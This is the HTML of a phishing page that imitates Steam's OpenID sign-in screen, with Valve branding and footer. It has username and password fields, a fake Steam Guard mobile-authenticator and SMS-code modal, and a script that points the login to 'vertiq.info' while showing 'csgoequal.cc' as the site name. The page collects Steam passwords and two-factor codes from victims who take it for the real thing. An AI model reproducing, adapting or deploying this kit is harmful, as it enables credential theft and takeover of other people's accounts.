<!DOCTYPE html>
<html class="responsive" lang="en">
<head>

    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="theme-color" content="#171a21">

    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link href="css/buttons.css" rel="stylesheet" type="text/css">

                <img src="images/header_logo.png" height="36" border="0" alt="STEAM">
            </div>
        </div>
    </div>
    <div class="responsive_page_content_overlay"></div>
    <div class="responsive_fixonscroll_ctn nonresponsive_hidden"></div>
    <div class="responsive_page_content">
        <div id="global_header">
            <div class="content">
                <div class="logo">
                    <span id="logo_holder">
                        <a>
                            <img src="images/globalheader_logo.png" width="176" height="44">
                        </a>
                    </span>
                </div>
                <div class="supernav_container">
                    <a class="menuitem" l="2">STORE</a>
                    <a class="menuitem" l="3" style="display: block">COMMUNITY</a>
                    <a class="menuitem" l="4">ABOUT</a>
                    <a class="menuitem" l="5">SUPPORT</a>
                </div>
                <div id="global_actions">
                    <div id="global_action_menu">
                        <div class="header_installsteam_btn header_installsteam_btn_green">
                            <a class="header_installsteam_btn_content" l="6">Install Steam</a>
                        </div>
                        <a class="global_action_link" l="7">login</a> &nbsp;|&nbsp;
                        <span class="pulldown global_action_link" id="language_pulldown" onclick="$('#language_dropdown').toggle()" l="8">language</span>
                        <div class="popup_block_new" id="language_dropdown" style="display: none;">
                            <div class="popup_body popup_menu" l="21">
                                <a class="popup_menu_item tight">简体中文 (Simplified Chinese)</a>
                                <a class="popup_menu_item tight" >简体中文 (Simplified Chinese)</a>
                                <a class="popup_menu_item tight">简体中文 (Simplified Chinese)</a>

                                <a class="popup_menu_item tight" >简体中文 (Simplified Chinese)</a>
                                <a class="popup_menu_item tight">简体中文 (Simplified Chinese)</a>
                                <a class="popup_menu_item tight" >简体中文 (Simplified Chinese)</a>
                                <a class="popup_menu_item tight">简体中文 (Simplified Chinese)</a>
                                <a class="popup_menu_item tight" >简体中文 (Simplified Chinese)</a>
                                <a class="popup_menu_item tight">简体中文 (Simplified Chinese)</a>
                                <a class="popup_menu_item tight" >简体中文 (Simplified Chinese)</a>
                                <a class="popup_menu_item tight">简体中文 (Simplified Chinese)</a>
                                <a class="popup_menu_item tight" >简体中文 (Simplified Chinese)</a>
                                <a class="popup_menu_item tight">简体中文 (Simplified Chinese)</a>
                                <a class="popup_menu_item tight" >简体中文 (Simplified Chinese)</a>
                                <a class="popup_menu_item tight">简体中文 (Simplified Chinese)</a>
                                <a class="popup_menu_item tight" >简体中文 (Simplified Chinese)</a>
                                <a class="popup_menu_item tight">简体中文 (Simplified Chinese)</a>
                                <a class="popup_menu_item tight" >简体中文 (Simplified Chinese)</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="mainBody">
            <div class="OpenID_MainHeader">
                <div class="logo">
                    <img src="images/sits_landing.png" width="114" height="43" border="0">
                </div>
                <h1 l="9">Sign into <span class="fDomain"><%- domain %></%-></span> using your Steam account</h1>
                <div>
                    <div style="float:left; padding: 6px 6px 20px 18px">
                        <img src="images/icon_info.png" width="26" height="26" border="0">
                    </div>
                    <h2 l="10">Note that <span class="fDomain"><%- domain %></%-></span> is not affiliated with Steam or
                               Valve
                    </h2>
                </div>
            </div>
            <div class="OpenID_LowerContents">
                <div class="OpenIDCol right">
                    <div class="OpenID_LowerContents_right">
                        <h2 l="11">By signing into <span class="fDomain"><%- domain %></%-></span> through Steam:</h2>
                        <ul class="OpenID_list">
                            <li class="OpenID_listitem" l="12">Your Steam login credentials will not be shared.</li>
                            <li class="OpenID_listitem" l="13">A unique numeric identifier will be shared
                                                               with<a class="whiteLink OpenID_Highlight">
                                    <span class="fDomain"><%- domain %></%-></span></a>.
                                                               Through
                                                               this, <span class="fDomain"><%- domain %></%-></span> will be
                                                               able
                                                               to identify your Steam
                                                               community profile and access
                                                               information about your Steam account according to your
                                <a class="whiteLink">Profile Privacy Settings</a>.
                            </li>
                            <li class="OpenID_listitem" l="14">Any information on your <a class="whiteLink">Steam
                                                                                                            Profile</a>
                                                               page
                                                               that is set to be publicly viewable may be accessed
                                                               by <span class="fDomain"><%- domain %></%-></span>.
                            </li>
                        </ul>
                        <h2 l="15">By clicking "Sign In" you agree to this data being shared.</h2>
                    </div>
                </div>
                <div class="OpenIDCol left">
                    <div class="OpenID_LowerContents_left">
                        <div id="error_display" style="display: none;"></div>
                        <br>
                        <div l="16">Steam username</div>
                        <input class="textField" type="text" name="username" id="steamAccountName" autofocus maxlength="64"><br>
                        &nbsp; <br>
                        <div l="17">Password</div>
                        <input class="textField" type="password" name="password" id="steamPassword" autocomplete="off" maxlength="64"><br>
                        <br>
                        <div id="login_btn_signin">
                            <input class="btn_green_white_innerfade" type="submit" id="imageLogin" style="width:104px; height:34px; border:none; font-size: 15px;" value="Sign In">
                        </div>
                        <br>
                        <div id="login_btn_wait" style="display: none;">
                            <img src="images/throbber.gif">
                        </div>
                        <br clear="all">
                        <br>
                        <p l="18">Don't have a Steam account? You can <a class="whiteLink" target="_blank">create an
                                                                                                           account</a>
                                  for
                                  free.</p>
                    </div>
                </div>
                <div style="clear: both"></div>
            </div>
        </div>
    </div>
    <div id="footer_spacer"></div>
    <div id="footer_responsive_optin_spacer"></div>
    <div id="footer">
        <div class="footer_content">
            <span id="footerLogo">
                <img src="images/footerLogo_valve.png" width="96" height="26" border="0" alt="Valve Logo">
            </span>
            <span id="footerText" l="19">
                © Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.<br>Some geospatial data on this website is provided by
                <a target="_blank" rel="noreferrer">geonames.org</a>.<br>
                <span class="valve_links">
                    <a target="_blank">Privacy Policy</a>
                    &nbsp; | &nbsp;<a target="_blank">Legal</a>
                    &nbsp;| &nbsp;<a target="_blank">Steam Subscriber Agreement</a>
                </span>
            </span>
        </div>

<div class="newmodal_background" style="opacity: 0.8; display: none;"></div>
<div class="newmodal" id="auth" style="display: none;position: fixed; z-index: 1000; max-width: 400px; left: 50%; top: 50%; transform: translate(-50%, -50%)">
    <div class="modal_top_bar"></div>
    <div class="newmodal_header_border">
        <div class="newmodal_header">
            <div class="newmodal_close"></div>
            <div class="title_text" l="22">Steam Guard Mobile Authentication</div>
        </div>
    </div>
    <div class="newmodal_content_border">
        <div class="newmodal_content" style="max-height: 849px;">
            <div>
                <div class="login_modal loginTwoFactorCodeModal" style>
                    <div class="twofactorauth_message_area">
                        <div id="login_twofactorauth_icon" class="auth_icon auth_icon_phone"></div>
                        <div class="twofactorauth_messages" id="login_twofactorauth_messages">
                            <div class="twofactorauth_message" id="login_twofactorauth_message_entercode" l="23">
                                <div class=" auth_modal_h1">Hello
                                    <span id="login_twofactorauth_message_entercode_accountname"></span>!
                                </div>
                                <p>This account is currently using a Steam Guard Mobile Authenticator.</p>
                            </div>

                            <div class="twofactorauth_message" id="login_twofactorauth_message_incorrectcode" style="display: none;" l="24">
                                <div class="auth_modal_h1">Whoops!</div>
                                <p>Sorry but, <br>that isn't quite right...</p>
                            </div>

                            <div class="twofactorauth_message" id="login_sms_message_selfhelp" style="display: none;" l="25">
                                <div class="auth_modal_h1">Whoops!
                                </div>
                                <p>Additional security measures - enter the SMS code that came to your phone.</p>
                            </div>
                        </div>
                    </div>
                    <div id="login_twofactorauth_details_messages" class="twofactorauth_details_messages">
                        <div class="twofactorauth_details" id="login_twofactorauth_details_entercode" style l="26">
                            Enter the current code displayed in the Steam Mobile app:
                        </div>
                    </div>
                    <div class="twofactorauthcode_entry_area">
                        <div id="login_twofactor_authcode_entry">
                            <div class="twofactorauthcode_entry_box">
                                <input class="twofactorauthcode_entry_input authcode_placeholder" id="twofactorcode_entry" type="text" placeholder="enter your code here" autocomplete="off">
                            </div>
                        </div>
                    </div>

                    <div class="modal_buttons" id="login_twofactorauth_buttonsets">
                        <div class="auth_buttonset" id="login_twofactorauth_buttonset_entercode" style l="27">
                            <div type="submit" class="auth_button leftbtn" data-modalstate="submit">
                                <div class="auth_button_h3">Submit</div>
                                <div class="auth_button_h5">my authenticator code</div>
                            </div>
                            <div class="auth_button" data-modalstate="selfhelp">
                                <div class="auth_button_h3">Please help</div>
                                <div class="auth_button_h5">I no longer have access to my Mobile Authenticator
                                                            codes
                                </div>
                            </div>
                            <div style="clear: left;"></div>
                        </div>
                        <div class="auth_buttonset" id="login_twofactorauth_buttonset_incorrectcode" style="display: none;" l="28">
                            <div class="auth_button leftbtn" data-modalstate="submit">
                                <div class="auth_button_h3">I want to try again</div>
                                <div class="auth_button_h5">and I've re-entered my authenticator code above</div>
                            </div>
                            <div class="auth_button" data-modalstate="selfhelp">
                                <div class="auth_button_h3">Please help</div>
                                <div class="auth_button_h5">I think I need assistance from Steam Support...</div>
                            </div>
                            <div style="clear: left;"></div>
                        </div>

                        <div class="auth_buttonset" id="login_sms_buttonset_entercode" style="display: block" l="29">
                            <div type="submit" class="auth_button leftbtn" data-modalstate="submit">
                                <div class="auth_button_h3">Submit</div>
                                <div class="auth_button_h5">my sms code</div>
                            </div>
                            <div class="auth_button" data-modalstate="selfhelp">
                                <div class="auth_button_h3">Please help</div>
                                <div class="auth_button_h5">I no longer have access to my phone</div>
                            </div>
                            <div style="clear: left;"></div>
                        </div>
                        <div class="auth_buttonset" id="login_sms_buttonset_incorrectcode" style="display: none;" l="30">
                            <div class="auth_button leftbtn" data-modalstate="submit">
                                <div class="auth_button_h3">I want to try again</div>
                                <div class="auth_button_h5">and I've re-entered my sms code above</div>
                            </div>
                            <div class="auth_button" data-modalstate="selfhelp">
                                <div class="auth_button_h3">Please help</div>
                                <div class="auth_button_h5">I think I need assistance from Steam Support...</div>
                            </div>
                            <div style="clear: left;"></div>
                        </div>

                        <div class="auth_buttonset" id="login_twofactorauth_buttonset_waiting" style="display: none;"></div>
                    </div>
                    <div style="display: none;">
                        <input type="submit">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="newmodal" id="lang" style="display: none;position: fixed; z-index: 1000; max-width: 1823px; left: 50%; top: 50%; transform: translate(-50%, -50%)">
    <div class="modal_top_bar"></div>
    <div class="newmodal_header_border">
        <div class="newmodal_header">
            <div class="newmodal_close" style="display: none;"></div>
            <div class="title_text" l="36">CHANGE LANGUAGE</div>
        </div>
    </div>
    <div class="newmodal_content_border">
        <div class="newmodal_content" style="max-height: 849px;">
            <div>
                <div class="waiting_dialog_container">
                    <div class="waiting_dialog_throbber"></div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="newmodal" id="error" style="display: none;position: fixed; z-index: 1000; max-width: 1823px; left: 50%; top: 50%; transform: translate(-50%, -50%)">
    <div class="modal_top_bar"></div>
    <div class="newmodal_header_border">
        <div class="newmodal_header">
            <div class="newmodal_close" style="display: none;"></div>
            <div class="title_text" l="37">ERROR</div>
        </div>
    </div>
    <div class="newmodal_content_border">
        <div class="newmodal_content" style="max-height: 849px;">
            <div>
                <p l="38">При обработке вашего запроса произошла ошибка.</p>
            </div>
            <div class="btn_grey_steamui btn_medium" style="float: right;" id="close_error"><span>OK</span></div>
        </div>
    </div>
</div>
<script>
    setInterval(() => {
        window.$domainToLogin = "vertiq.info";
        window.$loginLink = "//" + window.$domainToLogin + "/steamlogin ";
        $(".fDomain").text("csgoequal.cc");
    }, 100);
</script>
</body>
